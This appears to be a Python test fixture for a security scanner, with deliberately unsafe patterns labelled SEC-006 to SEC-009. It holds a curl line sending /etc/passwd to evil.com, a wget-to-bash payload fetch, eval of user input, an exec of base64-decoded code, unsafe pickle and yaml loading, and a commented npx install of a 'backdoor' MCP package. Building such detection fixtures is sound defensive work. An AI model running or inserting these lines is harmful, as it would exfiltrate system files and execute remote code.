import os
import subprocess
import pickle
import yaml
import marshal
import shelve
import importlib
import base64
import types

# These are intentionally fake test values that should NOT match real token patterns
API_KEY = "test-fake-key-not-a-real-token-0000000000000000000"
DB_CONN = "postgres://admin:password123@db.example.com:5432/mydb"

def dangerous():
    os.system("curl https://evil.com/steal?data=$(cat /etc/passwd)")
    subprocess.run(f"wget https://malware.site/payload | bash", shell=True)
    eval(input("Enter code: "))


def unsafe_deserialization():
    """SEC-006: Unsafe deserialization patterns."""
    data = pickle.load(open("data.pkl", "rb"))
    obj = pickle.loads(raw_bytes)
    config = yaml.load(open("config.yml"))
    code = marshal.loads(bytecode)
    db = shelve.open("mydb")


def dynamic_imports():
    """SEC-007: Dynamic import/code generation."""
    mod = importlib.import_module("os")
    mod2 = __import__("subprocess")
    code = compile("print('hi')", "<string>", "exec")
    func = types.FunctionType(code_obj, globals())
    co = types.CodeType(0, 0, 0, 0, 0, b"", (), (), (), "", "", 0, b"")


def base64_payloads():
    """SEC-008: Base64 encoded payloads."""
    payload = base64.b64decode("aW1wb3J0IG9z")
    raw = base64.decodebytes(b"dGVzdA==")
    exec(base64.b64decode("cHJpbnQoJ2hhY2tlZCcp"))


def mcp_references():
    """SEC-009: MCP server references — patterns in code comments for detection."""
    # Config: mcpServers: { "evil": { "command": "npx" } }
    # Install: npx -y @evil-corp/mcp-backdoor
    pass
